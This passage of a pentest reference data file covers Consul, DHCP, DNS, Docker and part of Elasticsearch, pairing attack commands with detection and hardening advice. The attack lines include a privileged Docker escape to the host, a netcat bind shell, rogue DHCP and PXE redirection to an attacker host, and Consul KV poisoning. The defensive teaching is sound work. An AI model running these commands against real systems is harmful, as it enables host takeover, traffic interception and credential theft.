    ],
    tools: ["curl", "nmap", "docker", "crane", "skopeo", "trivy"],
  },
  {
    slug: "consul",
    name: "Consul",
    port: 8500,
    protocol: "tcp",
    risk: "critical",
    tags: ["service-discovery", "key-value", "infrastructure", "hashicorp"],
    summary:
      "Consul provides service discovery, health checking and a distributed key-value store, and it is the backbone of many container platforms. The HTTP API on 8500 is the whole control plane, and while ACLs exist they are disabled by default in a lot of installations. The key-value namespace is a favourite place to park configuration, and configuration holds credentials. Service registration and the agent exec feature turn a read-only foothold into a foothold on the host.",
    connect: [
      {
        label: "HTTP API",
        command: "curl -s http://<target>:8500/v1/agent/self",
        detail:
          "The agent endpoint answers without authentication unless ACLs are enabled. The response includes the datacenter name, the node name and the agent configuration.",
      },
      {
        label: "Leader check",
        command: "curl -s http://<target>:8500/v1/status/leader",
        detail:
          "Returns the raft leader address. Useful for understanding the cluster topology and for separating client agents from servers.",
      },
      {
        label: "Consul CLI",
        command: "consul members -http-addr http://<target>:8500",
        detail:
          "The CLI talks to the HTTP API with the same permissions you have, so it is a convenient way to explore an agent.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 8500,8300,8600 --script http-title <target>",
        detail:
          "The HTTP API, the server RPC port and the embedded DNS port belong together. Finding all three tells you the role of the host in the cluster.",
      },
      {
        title: "Cluster services",
        command: "curl -s http://<target>:8500/v1/catalog/services | jq .",
        detail:
          "The service catalog lists every registered service in the datacenter. The names alone usually describe the estate well enough to plan the next step.",
      },
      {
        title: "Agent configuration",
        command: "curl -s http://<target>:8500/v1/agent/self | jq '.Config'",
        detail:
          "Shows the datacenter, the node name, the ACL status and the addresses the agent advertises. The ACL settings tell you what to expect from the API.",
      },
    ],
    enumeration: [
      {
        title: "Key-value namespace",
        command: "curl -s 'http://<target>:8500/v1/kv/?recurse' | jq .",
        detail:
          "A recursive read returns every key and its value. A single pass is enough to inventory the configuration the whole estate depends on.",
      },
      {
        title: "ACL tokens",
        command: "curl -s http://<target>:8500/v1/acl/tokens | jq '.[].AccessorID'",
        detail:
          "Listing tokens needs a management token, but some versions also expose the last used secret ID. If you get a list, treat every token as compromised.",
      },
      {
        title: "Service instances and tags",
        command: "curl -s http://<target>:8500/v1/catalog/service/<service> | jq '.[].ServiceAddress'",
        detail:
          "Instance metadata includes addresses, ports, tags and sometimes the full command line of the process that registered the service.",
      },
    ],
    attacks: [
      {
        title: "Anonymous read of the key-value store",
        severity: "critical",
        command: "curl -s 'http://<target>:8500/v1/kv/?recurse' | jq .",
        detail:
          "Without ACLs the key-value store is world readable. It is common to find database passwords, cloud credentials and API tokens in there, because that is where applications put them.",
        detection:
          "Recursive reads against the KV endpoint from an address that is not a registered client, and any sudden increase in read volume from a single host.",
        fix:
          "Enable ACLs from the first day, set a strong bootstrap token, and give each workload a token limited to the key prefixes it needs.",
      },
      {
        title: "Weak or leaked bootstrap token",
        severity: "critical",
        command: "curl -s -H 'X-Consul-Token: <token>' http://<target>:8500/v1/acl/tokens | jq .",
        detail:
          "The bootstrap token is a management credential with no expiry. It survives in configuration files, environment variables and CI settings long after it should have been rotated.",
        detection:
          "ACL token creation or list events, and use of a token from an address that has never contacted the agent before.",
        fix:
          "Rotate the bootstrap token, issue per-workload tokens with narrow policies, and store tokens in a secret manager rather than in files.",
      },
      {
        title: "Service registration to hijack traffic",
        severity: "high",
        command: "consul services register -http-addr http://<target>:8500 hijack.json",
        detail:
          "Registering a service with a chosen address makes the embedded DNS server resolve that name to you. Internal traffic that trusts Consul for discovery can be redirected without touching the application.",
        detection:
          "New service registrations and updates from addresses that are not registered agents, and DNS answers that changed for a well-known name.",
        fix:
          "Require a service registration token with write permission only for the platform, and monitor the catalogue for unexpected registrations.",
      },
    ],
    postEx: [
      {
        title: "Execute commands through the agent",
        severity: "critical",
        command: "consul exec -http-addr http://<target>:8500 <node> -- id",
        detail:
          "The exec endpoint runs a command on a node in the datacenter. It needs an agent write token and the exec feature enabled, and when it is available it is equivalent to remote code execution.",
        detection:
          "Exec requests in the agent logs and child processes appearing under the consul binary.",
        fix:
          "Leave the exec feature disabled, or restrict it to a dedicated automation token that is not distributed with applications.",
      },
      {
        title: "Poison the configuration store",
        severity: "high",
        command: "curl -s -X PUT http://<target>:8500/v1/kv/config/database/url -d 'jdbc:postgresql://<attacker-ip>:5432/app'",
        detail:
          "Write access to the key-value store lets you redirect applications to systems you control. The change looks like a routine configuration update and often sails through review.",
        detection:
          "Writes to keys under configuration prefixes, and diffs on the values that point at external endpoints.",
        fix:
          "Separate read and write policies for key prefixes, and review changes to connection strings and endpoints as code.",
      },
      {
        title: "Discover internal services and health data",
        severity: "medium",
        command: "curl -s http://<target>:8500/v1/catalog/services | jq -r 'keys[]'",
        detail:
          "The catalogue maps the internal estate, including health check output that can contain command lines, arguments and environment details of the registered process.",
        detection:
          "Catalogue enumeration from an address that is not a known client agent.",
        fix:
          "Restrict catalogue read access with ACLs and strip secrets out of service registration tags and check arguments.",
      },
    ],
    commands: [
      { command: "curl -s http://<target>:8500/v1/status/leader", description: "Returns the current raft leader." },
      { command: "curl -s http://<target>:8500/v1/catalog/services", description: "Lists all registered services." },
      { command: "curl -s 'http://<target>:8500/v1/kv/?recurse'", description: "Reads the whole key-value namespace." },
      { command: "curl -s http://<target>:8500/v1/kv/<key>", description: "Reads one key and its metadata." },
      { command: "curl -s -X PUT http://<target>:8500/v1/kv/<key> -d '<value>'", description: "Writes a value into the key-value store." },
      { command: "consul members -http-addr http://<target>:8500", description: "Lists the cluster members." },
      { command: "consul kv get -recurse -http-addr http://<target>:8500/", description: "Recursive key listing through the CLI." },
      { command: "consul services register -http-addr http://<target>:8500 <file>.json", description: "Registers a service definition." },
      { command: "consul exec -http-addr http://<target>:8500 <node> -- <command>", description: "Runs a command on a node through the agent." },
      { command: "curl -s http://<target>:8500/v1/acl/tokens", description: "Lists ACL tokens. Requires a management token." },
    ],
    hardening: [
      {
        title: "Enable ACLs immediately",
        detail:
          "Set acl to enabled and define a bootstrap token before anything else. A Consul without ACLs is an unauthenticated configuration database.",
      },
      {
        title: "Issue narrow per-workload tokens",
        detail:
          "Give each service a token limited to the key prefixes and services it needs. The management token belongs in a secret store and nowhere else.",
      },
      {
        title: "Enable mutual TLS between agents",
        detail:
          "Turn on gRPC TLS with verify_incoming so an agent on the segment cannot join the cluster and read the replicated state.",
      },
      {
        title: "Lock down the HTTP API",
        detail:
          "Bind the API to a private interface, front it with an authenticating proxy, and firewall 8500, 8301 and 8502 from user networks.",
      },
      {
        title: "Disable script checks and exec",
        detail:
          "Health checks can run scripts on the agent host. Leave script checks off and leave the exec feature disabled unless a documented workflow needs it.",
      },
      {
        title: "Audit the control plane",
        detail:
          "Turn on Consul audit logging and alert on KV writes, token creation and service registration changes.",
      },
    ],
    tools: ["curl", "nmap", "consul", "netcat"],
  },
  {
    slug: "dhcp",
    name: "DHCP",
    port: 67,
    protocol: "udp",
    risk: "high",
    tags: ["network", "udp", "infrastructure", "mitm"],
    summary:
      "DHCP hands a client its address, its gateway, its DNS servers and a surprising amount of extra information. A rogue server on the same segment can answer clients before the real one and redirect their traffic. Option 66 and option 67 in particular control which host a machine boots from, which turns DHCP into a way to replace a boot image. Because DHCP is broadcast UDP, detection from a single host is difficult, and the switch layer is where the defence lives.",
    connect: [
      {
        label: "Lease request",
        command: "sudo dhclient -1 -v -4 eth0",
        detail:
          "Sends a discover and prints the offer. Run it on a lab interface only, because it also reconfigures the interface you point it at.",
      },
      {
        label: "Broadcast discovery",
        command: "nmap --script broadcast-dhcp-discover -e eth0",
        detail:
          "Sends a discover on the local segment without changing anything on your machine. The reply prints the server identifier and the options it offers.",
      },
      {
        label: "Packet capture",
        command: "sudo tcpdump -i eth0 -n 'udp port 67 or udp port 68' -w dhcp.pcap",
        detail:
          "Captures the exchange between the client and the server so you can read every option, including the ones that are not shown by the client tools.",
      },
    ],
    recon: [
      {
        title: "Existing lease details",
        command: "grep -A 12 'lease {' /var/lib/dhcp/dhclient.leases",
        detail:
          "Your own lease file records the server identifier, the subnet mask, the routers, the DNS servers and the domain name. It is the cheapest first look.",
      },
      {
        title: "Server fingerprint",
        command: "nmap -sU -p 67 --reason --min-rate 500 <target>",
        detail:
          "DHCP servers rarely answer unicast probes, so the reason field and an open-port result are all you get from a scan. Use the broadcast script for real answers.",
      },
      {
        title: "Segment survey",
        command: "sudo tcpdump -n -i eth0 -e 'udp dst port 67' -c 20",
        detail:
          "Watching for server traffic on the segment shows which host answers and how often. On a shared segment this is also how you spot a rogue server.",
      },
    ],
    enumeration: [
      {
        title: "Offer options in detail",
        command: "sudo tcpdump -n -vvv -i eth0 -e 'udp port 67 or udp port 68'",
        detail:
          "The verbose decode lists option 3 for the router, option 6 for DNS, option 66 and 67 for the boot server and file, and option 43 for vendor extensions.",
      },
      {
        title: "Requested and offered values",
        command: "sudo nmap --script broadcast-dhcp-discover -e eth0",
        detail:
          "Prints the full parameter list from the server, including options that a normal DHCP client ignores entirely.",
      },
      {
        title: "Boot file and boot server",
        command: "sudo tcpdump -n -A -i eth0 'udp port 67' | grep -i -E 'filename|server-id|pxe'",
        detail:
          "The boot file name and boot server name point at the PXE infrastructure. A change in either one is a strong signal of tampering.",
      },
    ],
    attacks: [
      {
        title: "Rogue DHCP server",
        severity: "high",
        command:
          "sudo dnsmasq --interface=eth0 --bind-interfaces --port=0 --dhcp-range=10.0.0.100,10.0.0.200 --dhcp-option=3,10.0.0.1 --dhcp-option=6,10.0.0.1 --log-dhcp",
        detail:
          "A rogue server answers clients that are still waiting for the real one. By handing out a gateway and a resolver under your control you become the path for their traffic. Do this only on a segment you are authorised to test.",
        detection:
          "Duplicate DHCP server identifiers on the same segment, a change in the option 3 value, and clients that suddenly resolve to unfamiliar DNS servers.",
        fix:
          "Enable DHCP snooping on the access layer, bind the server to the trusted uplink port and rate limit the number of offers per client.",
      },
      {
        title: "Boot redirection through options 66 and 67",
        severity: "high",
        command:
          "sudo dnsmasq --interface=eth0 --bind-interfaces --port=0 --enable-tftp --tftp-root=/srv/tftp --dhcp-range=10.0.0.100,10.0.0.200 --dhcp-option=66,<attacker-ip>",
        detail:
          "The boot server name tells the client where to fetch its loader and the boot file name tells it what to fetch. Pointing both at a server you control replaces the machine's boot chain.",
        detection:
          "Any change to option 66 or 67 values, and TFTP traffic that no longer comes from the expected provisioning host.",
        fix:
          "Use DHCP snooping with option 66 and 82 validation, and rely on signed PXE or UEFI secure boot so an unsigned image will not run.",
      },
      {
        title: "DNS redirection through option 6",
        severity: "medium",
        command:
          "sudo dnsmasq --interface=eth0 --bind-interfaces --port=0 --dhcp-range=10.0.0.100,10.0.0.200 --dhcp-option=6,<attacker-ip> --log-queries=extra",
        detail:
          "Handing out your own resolver is quieter than replacing the gateway. It gives you name resolution and query logging for every client that takes the lease.",
        detection:
          "Resolvers in DHCP offers that do not match the approved list, and a change in the DNS servers on client devices.",
        fix:
          "Publish the resolver list centrally, enforce it with DHCP snooping, and pin the resolver configuration on managed clients.",
      },
    ],
    postEx: [
      {
        title: "Intercept traffic from consenting clients",
        severity: "high",
        command:
          "sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j DNAT --to-destination <ip>:8080 && sudo mitmproxy --mode transparent --showhost",
        detail:
          "Clients whose gateway you control will route their traffic through you. A transparent proxy then captures the cleartext portion, which on a corporate segment is still a meaningful amount.",
        detection:
          "Traffic leaving the segment with a different source MAC than the gateway, and certificate errors reported by clients.",
        fix:
          "Enforce DHCP snooping, use 802.1X so only authorised devices get a lease, and force TLS with HSTS for web traffic.",
      },
      {
        title: "Serve a modified boot image",
        severity: "critical",
        command:
          "sudo dnsmasq --interface=eth0 --bind-interfaces --port=0 --enable-tftp --tftp-root=/srv/tftp --dhcp-range=10.0.0.100,10.0.0.200 --dhcp-option=66,<attacker-ip> --dhcp-option=67,pxelinux.0",
        detail:
          "Combined with the boot redirection this lets you deliver a loader that is patched to ask for a password or to trust a different root. Provisioning integrity is the real control here.",
        detection:
          "Boot failures after a lease renewal, and machines reporting a different bootloader version than the build system publishes.",
        fix:
          "Use signed and verified PXE or UEFI HTTP boot, and treat the provisioning VLAN as a high-trust zone.",
      },
      {
        title: "Harvest queries from new leases",
        severity: "medium",
        command:
          "sudo dnsmasq --interface=eth0 --bind-interfaces --port=53 --no-resolv --server=1.1.1.1 --log-queries=extra --pid-file=/tmp/dnsmasq.pid",
        detail:
          "A resolver under your control logs every name the segment looks up, which reveals internal hostnames, SaaS tenants and application dependencies without touching a single endpoint.",
        detection:
          "DNS traffic from the segment arriving somewhere unexpected, and resolver configuration that does not match the approved list.",
        fix:
          "Force resolver configuration by DHCP with snooping, and use internal resolvers with query logging for detection rather than for interception.",
      },
    ],
    commands: [
      { command: "nmap --script broadcast-dhcp-discover -e eth0", description: "Broadcasts a discover and prints the offer." },
      { command: "sudo dhclient -1 -v -4 eth0", description: "Performs a full lease request on an interface." },
      { command: "sudo tcpdump -n -vvv -i eth0 -e 'udp port 67 or udp port 68'", description: "Captures and decodes DHCP exchanges." },
      { command: "sudo tcpdump -n -i eth0 'udp port 67' -w dhcp.pcap", description: "Writes DHCP traffic to a capture file." },
      { command: "grep -A 12 'lease {' /var/lib/dhcp/dhclient.leases", description: "Reads the local lease file for server details." },
      { command: "sudo nmap -sU -p 67 --min-rate 500 <target>", description: "Scans the DHCP port over UDP." },
      { command: "sudo dnsmasq --port=0 --dhcp-range=10.0.0.100,10.0.0.200 --dhcp-option=3,10.0.0.1 --interface=eth0", description: "Starts a test DHCP server on an isolated segment." },
      { command: "sudo killall -HUP dhclient && sudo dhclient eth0", description: "Renews a lease to observe the exchange." },
      { command: "ip addr show eth0 | grep -i inet", description: "Shows the address currently assigned to the interface." },
    ],
    hardening: [
      {
        title: "Enable DHCP snooping",
        detail:
          "On the access layer, mark the uplink as the only trusted port for server messages and drop everything else. This is the control that actually stops rogue servers.",
      },
      {
        title: "Use 802.1X or port security",
        detail:
          "Only authorised devices should be able to send DHCP requests at all, which removes the rogue server from the equation.",
      },
      {
        title: "Keep provisioning on its own VLAN",
        detail:
          "Move PXE and option 66 traffic to a dedicated provisioning network with strict filtering, so a compromise there does not reach the user estate.",
      },
      {
        title: "Reduce the lease and option surface",
        detail:
          "Disable option 43 and vendor extensions you do not use, and shrink the lease time so misconfiguration does not persist for weeks.",
      },
      {
        title: "Prefer static addressing where it fits",
        detail:
          "On small or sensitive segments, static configuration removes the DHCP attack surface entirely at a small management cost.",
      },
      {
        title: "Monitor the server identity",
        detail:
          "Log DHCP server identifiers and option 66 values, and alert when either changes or when a second server appears on the segment.",
      },
    ],
    tools: ["nmap", "tcpdump", "dnsmasq", "yersinia", "netcat"],
  },
  {
    slug: "dns",
    name: "DNS",
    port: 53,
    protocol: "udp",
    risk: "medium",
    tags: ["dns", "infrastructure", "udp", "recon"],
    summary:
      "DNS turns names into addresses, and it does a surprising amount of bookkeeping along the way. A single misconfigured server can hand over an entire zone through a zone transfer, and a dangling record can hand over a subdomain to whoever registers the matching cloud service. The protocol is unauthenticated by default, which is why resolvers have relied on source port randomisation for decades. DNS is also a convenient covert channel because every protocol is happy to carry it.",
    connect: [
      {
        label: "dig",
        command: "dig @<target> <domain> A +short",
        detail:
          "Queries one resolver directly. The +short form drops the boilerplate so you can read the answers at a glance.",
      },
      {
        label: "nslookup",
        command: "nslookup -type=any <domain> <target>",
        detail:
          "Works everywhere and is useful when dig is not installed. The ANY query is refused by most modern servers, which is itself informative.",
      },
      {
        label: "host",
        command: "host -t ns <domain> <target>",
        detail:
          "A compact resolver client that is handy inside scripts and containers where only a minimal toolchain exists.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sU -p 53 --script dns-nsid,dns-recursion,dns-service-discovery <target>",
        detail:
          "The NSID script asks for the server identifier and the recursion script tests whether the resolver will answer for names it does not host.",
      },
      {
        title: "Authoritative nameservers",
        command: "dig @<target> <domain> NS +short",
        detail:
          "Tells you whether the target is authoritative for the zone and where the real authority sits, which decides where to send a transfer request.",
      },
      {
        title: "Zone metadata",
        command: "dig @<target> <domain> SOA +short",
        detail:
          "The start of authority record names the primary server and the responsible mailbox, and the serial number tells you how current the zone is.",
      },
    ],
    enumeration: [
      {
        title: "Zone transfer attempt",
        command: "dig @<target> <domain> AXFR",
        detail:
          "Asks the server for a full copy of the zone. A refusal is the expected result and a transfer means every record in the zone is exposed.",
      },
      {
        title: "Recursive enumeration",
        command: "dnsrecon -d <domain> -n <target> -a",
        detail:
          "Tries transfers, finds the authoritative servers and probes for recursion. A resolver that recurses for outsiders hands out internal addresses.",
      },
      {
        title: "Reverse lookups",
        command: "dig @<target> -x <ip> +short",
        detail:
          "Reverse zones often contain more internal naming detail than the forward ones, and they are frequently served without a transfer restriction.",
      },
    ],
    attacks: [
      {
        title: "Zone transfer disclosure",
        severity: "high",
        command: "dig @<target> <domain> AXFR",
        detail:
          "A single successful transfer returns every host record, including internal addresses, VPN gateways, partner systems and staging hosts. It is one of the cheapest wins in a whole engagement.",
        detection:
          "Requests for AXFR from an address that is not one of the configured secondaries, logged by the authoritative server.",
        fix:
          "Restrict transfers to the secondary servers by address, and remove any zone that has no secondaries at all.",
      },
      {
        title: "Dangling record and subdomain takeover",
        severity: "medium",
        command: "dig @<target> <subdomain> CNAME +short",
        detail:
          "A CNAME that points at a deprovisioned service is a claim on someone else's resource. Registering or claiming that resource makes the subdomain yours, with the trust and cookies that come with it.",
        detection:
          "Periodic scans for CNAME records whose targets no longer resolve or no longer belong to you, plus certificate transparency logs for the affected names.",
        fix:
          "Remove records when a resource is decommissioned, and automate a check for dangling entries in the release process.",
      },
      {
        title: "Spoofed responses to a resolver",
        severity: "high",
        command:
          "sudo dnschef --control-ip 0.0.0.0 --control-port 9000 --fake-ip <ip> --domains <domain> -q",
        detail:
          "Forging a response to a vulnerable resolver makes every client that asks it believe the address you chose. Success depends on source port and transaction ID prediction, which is why randomisation exists.",
        detection:
          "Responses with mismatched transaction IDs, a sudden rise in non-standard source ports, and clients resolving to addresses that fail validation.",
        fix:
          "Force source port randomisation, enable DNSSEC validation on recursive resolvers, and use DNS over TLS or HTTPS for clients where you control them.",
      },
    ],
    postEx: [
      {
        title: "Rewrite records with dynamic update",
        severity: "high",
        command:
          "printf 'server <target>\\nzone <domain>\\nupdate add www.<domain> 60 A <ip>\\nsend\\n' | nsupdate",
        detail:
          "A TSIG key or an open update interface lets you change what a name resolves to. Redirecting a mail or a login host is enough to harvest credentials.",
        detection:
          "Dynamic update requests from an unexpected source, and records whose value changed without a matching change record.",
        fix:
          "Require TSIG keys on update, sign updates with a dedicated key, and never leave the update interface open to the network.",
      },
      {
        title: "Log the queries the segment makes",
        severity: "medium",
        command:
          "sudo dnsmasq --no-resolv --server=1.1.1.1 --log-queries=extra --interface=eth0 --port=53",
        detail:
          "A resolver under your control records every name the segment looks up. The list of internal names is a ready-made target list for the rest of the engagement.",
        detection:
          "Resolver traffic arriving outside the approved infrastructure, and any DNS service on an unapproved address.",
        fix:
          "Force resolver configuration centrally and keep DNS servers on the approved list only.",
      },
      {
        title: "Enumerate the internal zone with a wordlist",
        severity: "medium",
        command: "dnsrecon -d <domain> -n <target> -b /usr/share/wordlists/dnsrecon.txt",
        detail:
          "When transfers are closed, brute forcing common names still finds the interesting hosts, especially jump hosts, build servers and staging systems.",
        detection:
          "High query volume for a single zone from one source, and NXDOMAIN ratios far above normal.",
        fix:
          "Split the internal and external zones, and avoid publishing internal names in public records.",
      },
    ],
    commands: [
      { command: "dig @<target> <domain> A +short", description: "Resolves a name against a specific server." },
      { command: "dig @<target> <domain> AXFR", description: "Attempts a full zone transfer." },
      { command: "dig @<target> <domain> NS +short", description: "Lists the authoritative nameservers." },
      { command: "dig @<target> <domain> SOA +short", description: "Shows zone metadata and the serial number." },
      { command: "dig @<target> <domain> ANY", description: "Asks for all record types. Usually refused." },
      { command: "dig +trace <domain>", description: "Walks the delegation chain from the root." },
      { command: "dig @<target> -x <ip> +short", description: "Reverse resolves an address." },
      { command: "host -t any <domain> <target>", description: "Compact query with the host tool." },
      { command: "nslookup -type=ns <domain> <target>", description: "Alternative resolver client for scripting." },
      { command: "dnsrecon -d <domain> -n <target>", description: "Runs a broader enumeration of the zone." },
    ],
    hardening: [
      {
        title: "Restrict zone transfers",
        detail:
          "Allow transfers only to named secondary servers by address, and log every transfer attempt so an unexpected success is visible.",
      },
      {
        title: "Sign the zone with DNSSEC",
        detail:
          "DNSSEC lets validating resolvers detect forged answers, which is the only structural defence against response spoofing.",
      },
      {
        title: "Use TSIG for dynamic update",
        detail:
          "Updates should be authenticated with a shared key and restricted to the zones that genuinely need them.",
      },
      {
        title: "Randomise queries and split zones",
        detail:
          "Force source port randomisation and query name case randomisation, and keep internal names in an internal zone that the public resolvers never serve.",
      },
      {
        title: "Keep resolvers internal",
        detail:
          "Never expose port 53 to the internet. Use internal resolvers with query logging for visibility, and separate recursive from authoritative servers.",
      },
      {
        title: "Audit for dangling records",
        detail:
          "Scan the estate for CNAME and A records whose targets are unclaimed or decommissioned, and tie that check to the decommissioning process.",
      },
    ],
    tools: ["nmap", "dig", "dnsrecon", "fierce", "nsupdate", "netcat"],
  },
  {
    slug: "docker",
    name: "Docker",
    port: 2375,
    protocol: "tcp",
    risk: "critical",
    tags: ["container", "api", "linux", "devops"],
    summary:
      "The Docker Engine API on 2375 is a remote control interface for the container runtime, and it has no authentication of its own. Anyone who can reach it can start a privileged container with the host filesystem mounted, which is root on the machine within seconds. The API also exposes every container, image, volume and log the host has, so a read-only connection is already a serious disclosure. The TLS-protected alternative is 2376, and the correct default is a unix socket with no network listener at all.",
    connect: [
      {
        label: "API version",
        command: "curl -s http://<target>:2375/version | jq .",
        detail:
          "Returns the API version, the Go runtime version and the component list. It confirms you are talking to a daemon and it tells you which features are available.",
      },
      {
        label: "Docker client over TCP",
        command: "export DOCKER_HOST=tcp://<target>:2375 && docker ps -a",
        detail:
          "Pointing the client at the remote daemon gives you the full command set, including the ability to create and start containers.",
      },
      {
        label: "Info endpoint",
        command: "curl -s http://<target>:2375/info | jq '{Containers, Images, Driver, SecurityOptions}'",
        detail:
          "Shows how many containers and images exist, which storage driver is in use and which security options such as seccomp are enabled.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 2375,2376 --script http-title,http-methods <target>",
        detail:
          "The API answers with a JSON document. A 200 on the root endpoint means no authentication is required for anything.",
      },
      {
        title: "Version fingerprint",
        command: "curl -s http://<target>:2375/version | jq '{Version, ApiVersion, GitCommit}'",
        detail:
          "The exact engine version lets you match it against known issues instead of guessing, and it tells you which API verbs are supported.",
      },
      {
        title: "Runtime hardening options",
        command: "curl -s http://<target>:2375/info | jq '.SecurityOptions'",
        detail:
          "The security options list shows whether seccomp, AppArmor, user namespace remapping and rootless mode are active on the host.",
      },
    ],
    enumeration: [
      {
        title: "Container inventory",
        command: "curl -s 'http://<target>:2375/containers/json?all=1' | jq '.[] | {Names, Image, Ports}'",
        detail:
          "Lists every container including stopped ones. Names such as a database or an internal admin service tell you what the host is doing.",
      },
      {
        title: "Images and layers",
        command: "curl -s http://<target>:2375/images/json | jq '.[] | {RepoTags, Id, Size}'",
        detail:
          "Image tags often reveal the application, the environment and the deployment channel, and they map directly to what is on the host.",
      },
      {
        title: "Volumes and networks",
        command: "curl -s http://<target>:2375/volumes | jq . && curl -s http://<target>:2375/networks | jq '.[].Name'",
        detail:
          "Named volumes usually hold databases and uploads. The network list shows the other containers the host trusts.",
      },
    ],
    attacks: [
      {
        title: "Unauthenticated API access",
        severity: "critical",
        command:
          "curl -s http://<target>:2375/containers/json?all=1 | jq '.[].Names'",
        detail:
          "The API has no built-in authentication. Whatever the API can do, the caller can do, and the API can start containers.",
        detection:
          "API requests from addresses that are not the deployment tooling, especially container create and run calls, and unusual request volume on 2375.",
        fix:
          "Never expose 2375. Bind the daemon to a unix socket, expose TLS on 2376 with client certificates, and firewall the port from every network.",
      },
      {
        title: "Privileged container with the host mounted",
        severity: "critical",
        command:
          "docker -H tcp://<target>:2375 run --rm -it --privileged -v /:/host alpine chroot /host sh",
        detail:
          "A privileged container with the root filesystem bind mounted is root on the host. From there the host kernel, the SSH keys and the cloud metadata are all one command away.",
        detection:
          "Container create requests with Privileged set, or with a bind mount of the root filesystem. Unexpected containers in docker ps on the host.",
        fix:
          "Remove the API from the network, and if a remote daemon is required, front it with a socket proxy that denies the create and exec endpoints.",
      },
      {
        title: "Exec into a running production container",
        severity: "high",
        command: "docker -H tcp://<target>:2375 exec -it <container> sh",
        detail:
          "Writing into a live container changes a running application with no deployment, no review and no rollback. It is quieter than starting a new container.",
        detection:
          "Exec create and exec start calls against long-running containers, and process lists inside the container that do not match the image.",
        fix:
          "Do not expose the API, and treat the daemon socket as a root-equivalent credential in your access control model.",
      },
    ],
    postEx: [
      {
        title: "Read the host filesystem",
        severity: "critical",
        command: "docker -H tcp://<target>:2375 run --rm -v /:/host alpine ls -la /host",
        detail:
          "A read-only mount of the host root exposes the cloud configuration, the SSH authorised keys and every other container's secrets on that host.",
        detection:
          "Containers created with a mount of the host root or of /etc, /root or /var/run/docker.sock.",
        fix:
          "Close the API, and treat any host bind mount from a workload as a critical finding in your own environment.",
      },
      {
        title: "Pull secrets out of a stopped container",
        severity: "high",
        command: "docker -H tcp://<target>:2375 cp <container>:/app/.env ./env",
        detail:
          "Environment files, config files and mounted secrets from a previous deployment remain in the container filesystem even after the container is stopped.",
        detection:
          "Container archive or copy operations against containers that are not running, and reads of the container filesystem API.",
        fix:
          "Remove containers after use, keep secrets in a manager rather than in files, and rotate anything that has sat in a container layer.",
      },
      {
        title: "Publish a listener from the host",
        severity: "high",
        command:
          "docker -H tcp://<target>:2375 run -d --name tunnel -p 4444:4444 alpine nc -lvnp 4444 -e /bin/sh",
        detail:
          "Port publishing reaches outside the container network, so this gives you a listener that appears to belong to the host and survives the container it came from.",
        detection:
          "Containers with published ports that do not match a deployment record, and unexpected listeners on the host.",
        fix:
          "Restrict published ports, use a reverse proxy for ingress, and review container creation on the host.",
      },
    ],
    commands: [
      { command: "curl -s http://<target>:2375/version", description: "Returns the daemon version and API version." },
      { command: "curl -s http://<target>:2375/info", description: "Returns host and runtime information." },
      { command: "curl -s 'http://<target>:2375/containers/json?all=1'", description: "Lists containers, running and stopped." },
      { command: "curl -s http://<target>:2375/images/json", description: "Lists locally available images." },
      { command: "curl -s http://<target>:2375/volumes", description: "Lists named volumes." },
      { command: "docker -H tcp://<target>:2375 ps -a", description: "Runs the client against the remote daemon." },
      { command: "docker -H tcp://<target>:2375 run -it --rm alpine sh", description: "Starts an interactive container through the API." },
      { command: "docker -H tcp://<target>:2375 exec -it <container> sh", description: "Executes a shell inside a running container." },
      { command: "docker -H tcp://<target>:2375 logs <container>", description: "Reads container logs." },
      { command: "docker -H tcp://<target>:2375 inspect <container>", description: "Shows the full container configuration and mounts." },
    ],
    hardening: [
      {
        title: "Remove the network listener",
        detail:
          "Configure the daemon to listen on a unix socket only. If remote access is genuinely required, use 2376 with mutual TLS and strict client certificate checks.",
      },
      {
        title: "Use a socket proxy",
        detail:
          "A proxy in front of the daemon can allow a read-only subset of endpoints and deny create, run and exec for everyone else.",
      },
      {
        title: "Treat the socket as root",
        detail:
          "Never mount the Docker socket into an application container. It is equivalent to a root shell on the host.",
      },
      {
        title: "Contain the runtime",
        detail:
          "Enable user namespace remapping, keep the default seccomp and AppArmor profiles, drop unnecessary capabilities and set no-new-privileges on workloads.",
      },
      {
        title: "Manage privileged containers",
        detail:
          "Audit for privileged containers and for host network mode, and route any request for them through an approved change process.",
      },
      {
        title: "Patch and monitor the host",
        detail:
          "Keep the engine patched, enable the daemon audit log, and alert on container create, run and exec events.",
      },
    ],
    tools: ["curl", "nmap", "docker", "metasploit", "netcat"],
  },
  {
    slug: "elasticsearch",
    name: "Elasticsearch",
    port: 9200,
    protocol: "tcp",
    risk: "high",
    tags: ["search", "database", "rest", "logging"],
    summary:
      "Elasticsearch exposes a plain REST API for indexing and searching, and it happily returns full documents to anyone who asks. Versions before 8 have no authentication unless it has been switched on, and installations that log everything end up with application data, user records and credentials in their indices. The scripting API can execute code on the cluster nodes, which turns a read-only exposure into node-level access. Kibana sits in front of it and adds another surface of its own.",
    connect: [
      {
        label: "Cluster root",
        command: "curl -s http://<target>:9200/ | jq .",
        detail:
          "Returns the cluster name, the version and a tagline. The name alone often names the environment and the team that owns it.",
      },
      {
        label: "Authenticated request",
        command: "curl -s -u elastic:<password> http://<target>:9200/_security/_authenticate",
        detail:
          "Confirms which account the credentials belong to and which roles it holds.",
      },
      {
        label: "Cluster health",
        command: "curl -s 'http://<target>:9200/_cluster/health?pretty'",
        detail:
          "Shows status, node count and shard counts. A yellow or red status explains why the cluster is oversized or missing replicas.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 9200,9300 --script http-title,http-headers <target>",
        detail:
          "The node port 9300 speaks the binary transport used for cluster traffic. Finding it confirms this is a real cluster node and not a proxy.",
      },
      {
        title: "Version fingerprint",
        command: "curl -s http://<target>:9200/ | jq '{version: .version.number, tagline}'",
        detail:
          "The version number decides which security defaults apply and which issues are relevant.",
      },
      {
        title: "Security status",
        command: "curl -s http://<target>:9200/_security/_authenticate | jq .",
        detail:
          "An authentication error means security is enabled and anonymous access is refused. A full user object means it is not.",
      },
    ],
    enumeration: [
      {
        title: "Index inventory",
        command: "curl -s 'http://<target>:9200/_cat/indices?v&s=index'",
        detail:
          "The index names describe what the cluster stores. Names such as application-logs or customer-records tell you where the interesting data is.",
      },
      {
        title: "Cluster nodes",
        command: "curl -s 'http://<target>:9200/_cat/nodes?v'",
        detail:
